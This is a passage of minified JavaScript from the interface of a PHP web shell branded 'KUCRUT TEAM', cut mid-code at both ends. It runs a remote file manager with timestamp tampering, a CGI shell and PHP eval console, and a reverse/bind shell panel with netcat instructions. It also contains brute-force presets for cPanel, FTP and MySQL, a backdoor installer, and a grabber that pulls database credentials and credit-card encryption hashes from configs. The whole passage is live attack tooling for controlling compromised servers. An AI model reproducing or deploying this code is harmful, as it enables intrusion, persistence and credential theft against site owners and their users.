.editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <img opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' src='https://kucrut.xyz/images/delete.svg'></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),kucrutloader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?kucrutloader(b,"block"):(kucrutloader("editor","block"),b="editor")),_Ajax(d.URL,"a="+kucrutb64("FilesTools")+"&c="+kucrutb64(f)+"&kucrut1="+kucrutb64(e)+"&kucrut2="+kucrutb64(a)+"&kucrut3="+r+"&kucrut4="+n+"&kucrut5=&kucrut6=&kucrut7=&kucrut8=&kucrut9=&kucrut10=&&ajax="+kucrutb64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),kucrutShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&kucrutUpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?kucrutLoaderOnTop("none"):kucrutloader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&kucrutShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&kucrutShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),kucrutLoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function kucrutLoadAceEditor(e,a){if(void 0===a&&(a=!1),null==$("kucrut-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="kucrut-ace-plugin",t.onload=function(){kucrutLoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==kucrut_ace_editors.editor&&(kucrut_ace_editors.editor={});var i=getCookie("kucrut_ace_theme_editor"),l=getCookie("kucrut_ace_fontsize_editor");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),kucrut_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),kucrut_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),kucrut_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),kucrut_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),kucrut_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),kucrut_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),kucrut_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){kucrut_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==kucrut_ace_editors.eval&&(kucrut_ace_editors.eval={});i=getCookie("kucrut_ace_theme_eval"),l=getCookie("kucrut_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),kucrut_ace_editors.eval["phpeval-"+o]=ace.edit(t),kucrut_ace_editors.eval["phpeval-"+o].setReadOnly(a),kucrut_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),kucrut_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),kucrut_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),kucrut_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){kucrut_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+kucrutb64("checkfiletype")+"&path="+kucrutb64(editor_files[t].pwd)+"&arg="+kucrutb64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","kucrut","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="https://solevisible.com/icons/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("kucrut_history_files",btoa(JSON.stringify(editor_files)),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=kucrut_ace_editors.editor[e].selection.toJSON();kucrut_ace_editors.editor[e].selectAll(),kucrut_ace_editors.editor[e].focus(),document.execCommand("copy"),kucrut_ace_editors.editor[e].selection.fromJSON(a),kucrutShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=kucrutb64(e,!0),a=kucrutb64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return kucrutb64(i,!0)}function reloadSetting(e){return kucrutloader(kucrut_before_do_action_id,"block"),_Ajax(d.URL,"a="+kucrutb64("settings")+"&kucrut1="+kucrutb64(e.protect.value)+"&kucrut2="+kucrutb64(e.lgpage.value)+"&kucrut3="+kucrutb64(e.username.value)+"&kucrut4="+kucrutb64(e.password.value)+"&kucrut5="+kucrutb64(">>")+"&kucrut6="+kucrutb64(e.icon.value)+"&kucrut7="+kucrutb64(e.post_encrypt.value)+"&kucrut8="+kucrutb64("main")+"&kucrut9="+kucrutb64(e.cgi_api.value)+"&c="+kucrutb64(c_)+"&ajax="+kucrutb64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),kucrutloader(a,"none")},!1,kucrut_before_do_action_id),kucrut_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+kucrutb64("settings")+"&kucrut1="+kucrutb64(JSON.stringify(a))+"&kucrut2="+kucrutb64(">>")+"&kucrut3="+kucrutb64(t)+"&kucrut8="+kucrutb64("color")+"&c="+kucrutb64(c_)+"&ajax="+kucrutb64("true"),function(e){evalJS(e)},!0)}function kucrutb64(e,a){return void 0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __HOST_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=kucrut_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+kucrutb64("cgishell")+"&kucrut1="+kucrutb64(e)+"&ajax="+kucrutb64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
+var kucrut1_="",kucrut2_="",kucrut3_="",kucrut4_="",kucrut5_="",kucrut6_="",kucrut7_="",kucrut8_="",kucrut9_="",kucrut10_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,kucrut_can_add_opt=!1,kucrut_before_do_action_id="",kucrut_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_KUCRUT_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],kucrut_current_fm_id=1,kucrut_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.kucrut1.value=null!=t?t:"",d.mf.kucrut2.value=null!=i?i:"",d.mf.kucrut3.value=null!=l?l:"",d.mf.kucrut4.value=null!=o?o:"",d.mf.kucrut5.value=null!=r?r:"",d.mf.kucrut6.value=null!=n?n:"",d.mf.kucrut7.value=null!=s?s:"",d.mf.kucrut8.value=null!=c?c:"",d.mf.kucrut9.value=null!=f?f:"",d.mf.kucrut10.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=kucrut_current_fm_id,t="a="+kucrutb64("FilesMan")+"&c="+kucrutb64(e.c.value)+"&kucrut1="+kucrutb64(e.kucrut1.value)+"&ajax="+kucrutb64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+kucrutb64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.kucrut1.value)return!1;switch(kucrutloader("filesman_holder_"+a,"block"),e.kucrut1.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){kucrutloader("filesman_holder_"+a,"none"),kucrutFmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",kucrutInitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_KUCRUT_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof t&&(t(o.responseText,l),kucrutClearAjax(l)):4==o.readyState&&200!=o.status&&(kucrutAjaxError(o.status,l,o.statusText,o.responseText),kucrutClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function kucrutClearAjax(e){_KUCRUT_AJAX_.hasOwnProperty(e)&&delete _KUCRUT_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=kucrut_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",kucrutb64(e.a.value)),l.append("c",kucrutb64(e.c.value)),l.append("kucrut1",kucrutb64(e.kucrut1.value)),l.append("charset",kucrutb64(e.charset.value)),l.append("ajax",kucrutb64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_KUCRUT_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":kucrutAjaxError(a.status,"upload_area",a.statusText,a.responseText),kucrutClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx" id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><a row="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),kucrutShowNotification("File(s) uploaded successfully","Uploader"),kucrutFmngrContextRow()}else kucrutShowNotification("Folder has no permission...","Uploader","error");kucrutCheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function kucrutCheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,kucrut1,kucrut2,kucrut3,kucrut4,kucrut5,kucrut6,kucrut7,kucrut8,kucrut9,kucrut10,charset){var fm_id=0==kucrut_fm_id?kucrut_current_fm_id:kucrut_fm_id,fm_id2=kucrut_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=kucrut_before_do_action_id;0==kucrut_fm_id&&(set(a,c,kucrut1,kucrut2,kucrut3,kucrut4,kucrut5,kucrut6,kucrut7,kucrut8,kucrut9,kucrut10,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=kucrut2&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(kucrutloader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?kucrutloader(g_action_id,"block"):"FilesTools"!=a&&"download"!=kucrut2&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),kucrutloader(g_action_id,"block"));for(var data="a="+kucrutb64(a)+"&c="+kucrutb64(d_mf_c)+"&",i=1;i<=10;i++)data+="kucrut"+i+"="+kucrutb64(eval("d.mf.kucrut"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+kucrutb64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+kucrutb64("true"),"FilesTools"==a&&"download"==kucrut2){kucrutLoaderOnTop("none");var dl=$("dlForm");return dl.a.value=kucrutb64("dlfile"),dl.c.value=kucrutb64(d_mf_c),dl.file.value=kucrutb64(kucrut1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(kucrutLoaderOnTop("none"),"sql"==a)return console.log(t),loadPopUpDatabase(e,t),!1;if("FilesMan"==a){kucrutloader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=kucrutGetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,kucrutFmngrContextRow(),"function"==typeof kucrut1&&kucrut1(e),kucrutCheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||kucrutloader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&kucrutLoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&kucrutColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(kucrutloader(kucrut3,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}kucrutloader(t,"none")},!1,kucrut3))}function kucrutGetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function kucrutloader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor .editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="kucrutAjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="kucrutteam-loader-text">KUCRUT TEAM</div><div class="kucrut-ajax-error"></div><img src=\'https://iili.io/2M3GdE7.png\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),kucrutloader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+kucrutb64("Sql")+"&kucrut1="+kucrutb64("query")+"&kucrut2=&c="+kucrutb64(c_)+"&charset="+kucrutb64("UTF-8")+"&type="+kucrutb64(n)+"&sql_host="+kucrutb64(i)+"&sql_login="+kucrutb64(l)+"&sql_pass="+kucrutb64(o)+"&sql_base="+kucrutb64(r)+"&sql_count="+kucrutb64(s)+"&current_mysql_id="+kucrutb64(a)+"&ajax="+kucrutb64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),kucrutloader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<label class="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function kucrut_searcher_tool(e){switch(e){case"all":case"dirs":_kucrutSet(!0,"Disabled");break;case"files":_kucrutSet(!1,"php")}}function _kucrutSet(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function kucrutAjaxError(e,a,t,i){if(void 0!==a){var 